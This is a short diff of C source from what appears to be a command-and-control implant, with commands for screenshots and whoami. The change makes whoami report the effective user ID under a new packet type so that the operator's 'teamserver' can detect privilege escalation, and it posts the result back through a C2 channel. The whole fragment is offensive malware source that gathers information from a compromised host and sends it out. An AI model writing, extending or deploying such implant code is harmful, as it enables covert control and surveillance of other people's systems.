@@ -1070,12 +1070,12 @@ void cmd_screenshot(uint32_t req_id) {
 // ── whoami /all ───────────────────────────────────────────────────────────────
 
 void cmd_whoami(uint32_t req_id, int all_flag) {
-    // plain whoami: just the username
+    // plain whoami: report euid so teamserver can detect privesc
     if (!all_flag) {
-        uid_t uid = getuid();
-        struct passwd* pw = getpwuid(uid);
+        uid_t euid = geteuid();
+        struct passwd* pw = getpwuid(euid);
         const char* name = pw ? pw->pw_name : "?";
-        Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, name);
+        Buf* pkt = build_output_packet(req_id, TENGU_WHOAMI, name);
         g_c2_post(pkt->data, pkt->size, NULL, NULL);
         buf_free(pkt);
         return;
